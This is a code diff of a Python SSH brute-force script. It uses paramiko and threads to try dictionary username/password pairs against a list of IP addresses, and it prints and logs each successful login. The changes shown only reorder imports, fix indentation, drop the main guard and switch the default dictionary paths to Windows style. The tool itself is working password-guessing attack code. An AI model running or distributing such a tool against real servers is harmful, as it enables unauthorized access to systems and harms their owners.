@@ -1,5 +1,9 @@
+import os
+import paramiko
+import sys
+import threading
+import time
 
-import paramiko, threading, sys, time, os
 
 
 class SSHThread(threading.Thread):
@@ -26,7 +30,7 @@ class SSHThread(threading.Thread):
                 ssh.connect(self.ip, self.port, username, pwd, timeout=self.timeout)
                 print("\nIP => %s, Login %s => %s \n" % (self.ip, username, pwd))
                 open(self.LogFile, "a").write("[ %s ] IP => %s, port => %d, %s => %s \n" % (
-                time.asctime(time.localtime(time.time())), self.ip, self.port, username, pwd))
+                    time.asctime(time.localtime(time.time())), self.ip, self.port, username, pwd))
                 break
             except:
                 print("IP => %s, Error %s => %s" % (self.ip, username, pwd))
@@ -58,15 +62,14 @@ def help():
     exit(1)
 
 
-if __name__ == '__main__':
 
-    fpath = os.path.dirname(os.path.abspath('__file__'))
-    ipFile = sys.argv[1] if len(sys.argv) > 1 else fpath + "/dict/ip"
-    dic = sys.argv[2] if len(sys.argv) > 2 else fpath + "/dict/password"
-    log = sys.argv[3] if len(sys.argv) > 3 else fpath + "/log/sshd"
+fpath = os.path.dirname(os.path.abspath('__file__'))
+ipFile = sys.argv[1] if len(sys.argv) > 1 else fpath + "\\ip.txt"
+dic = sys.argv[2] if len(sys.argv) > 2 else fpath + "\\password.txt"
+log = sys.argv[3] if len(sys.argv) > 3 else fpath + "\\sshd"
 
-    try:
-        os.system("clear")
-        main(ipFile, dic, log)
-    except KeyboardInterrupt:
-        exit(1)
+try:
+    os.system("clear")
+    main(ipFile, dic, log)
+except KeyboardInterrupt:
+    exit(1)
